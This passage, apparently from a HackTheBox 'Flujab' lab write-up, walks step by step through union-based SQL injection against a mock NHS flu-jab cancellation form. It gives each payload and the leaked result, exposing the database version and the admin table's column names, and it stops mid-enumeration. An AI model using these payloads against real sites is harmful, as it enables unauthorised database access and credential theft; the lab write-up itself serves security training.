class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/55.png" alt=""><br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cancel</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: freeflujab.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: https://freeflujab.htb/?cancel</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 65</span><br><span class="line"><span class="attribute">Cookie</span>: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">nhsnum=test&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 13 Jun 2019 14:13:42 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Server</span>: ClownWare Proxy</span><br><span class="line"><span class="attribute">Content-Length</span>: 5204</span><br></pre></td></tr></table></figure>
<p>Now if we check the <code>smtp</code> server we can see that the cancellation email was sent successfully :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:13:40 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:</span><br><span class="line">Message-ID: &lt;219504b93c84fb0e94fef1ae3d31707d@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : test</span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>


<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p>I tried to play around with that input (<code>nhsnum</code>), I tried a lot of stuff and when I tried union based <code>sql</code> injection I got a hit (a good <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html" target="_blank" rel="noopener">reference</a>):<br><img src="/images/hackthebox/flujab/59.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,@@datadir,<span class="number">4</span>,<span class="number">5</span>;<span class="comment">#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p>This payload prints the data directory.<br><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:20:32 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;</span><br><span class="line">Message-ID: &lt;9bcabe79f1782598002cc31abc3bb333@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,@@datadir,4,5;#</span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Database version :<br><img src="/images/hackthebox/flujab/61.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,@@<span class="keyword">version</span>,<span class="number">4</span>,<span class="number">5</span>;<span class="comment">#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:24:50 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1</span><br><span class="line">Message-ID: &lt;d2e238de2ef64c5dd385e30472c94d5e@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,@@version,4,5;#</span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Great. Let’s get the table name :<br><img src="/images/hackthebox/flujab/63.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,table_name,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:28:15 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:admin</span><br><span class="line">Message-ID: &lt;e389b6f96e0104edf7b12bd167666fb3@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema&#x3D;database()--                              </span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Table name is <code>admin</code> let’s get the column names :<br><img src="/images/hackthebox/flujab/65.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span><span class="comment">--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:38:55 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:id</span><br><span class="line">Message-ID: &lt;50be6357006cbedc546152de64cd5407@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39;--     </span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>This gave us the first column name which is <code>id</code>, to get the rest of the column names we will add <code>and column_name!=&#39;PREVIOUS COLUMN NAME HERE&#39;</code>.<br><img src="/images/hackthebox/flujab/67.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span> <span class="keyword">and</span> column_name!=<span class="string">'id'</span><span class="comment">--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:41:26 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:loginname</span><br><span class="line">Message-ID: &lt;3d6a306c2827c5d6b3e44ae2c9602d2e@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39; and column_name!&#x3D;&#39;id&#39;--</span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Second column : <code>loginname</code><br><img src="/images/hackthebox/flujab/69.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span> <span class="keyword">and</span> column_name!=<span class="string">'id'</span> <span class="keyword">and</span> column_name!=<span class="string">'loginname'</span><span class="comment">--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:44:08 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:namelc</span><br><span class="line">Message-ID: &lt;8a8dbbfb4a4c3a0968c819bc9e188e6c@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39; and column_name!&#x3D;&#39;id&#39; and column_name!&#x3D;&#39;loginname&#39;--</span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Third column : <code>namelc</code><br><img src="/images/hackthebox/flujab/71.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span> <span class="keyword">and</span> column_name!=<span class="string">'id'</span> <span class="keyword">and</span> column_name!=<span class="string">'loginname'</span> <span class="keyword">and</span> column_name!=<span class="string">'namelc'</span><span class="comment">--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------</span><br><span class="line">Date: Thu, 13 Jun 2019 15:46:45 +0100</span><br><span class="line">To: cancelations@no-reply.flujab.htb</span><br><span class="line">From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:email</span><br><span class="line">Message-ID: &lt;087443e0a9489da3ec320a89cc3df41b@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line">    CANCELLATION NOTICE!</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : &#39; UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39; and column_name!&#x3D;&#39;id&#39; and column_name!&#x3D;&#39;loginname&#39; and column_name!&#x3D;&#39;namelc&#39;--                                                                    </span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Stat   : CANCELED</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  Your flu jab appointment has been canceled.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>Fourth column : <code>email</code><br><img src="/images/hackthebox/flujab/73.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nhsnum=' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span> <span class="keyword">and</span> column_name!=<span class="string">'id'</span> <span class="keyword">and</span> column_name!=<span class="string">'loginname'</span> <span class="keyword">and</span> column_name!=<span class="string">'namelc'</span> <span class="keyword">and</span> column_name!=<span class="string">'email'</span><span class="comment">--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment</span></span><br></pre></td></tr></table></figure>
<p><code>smtp</code> :</p>
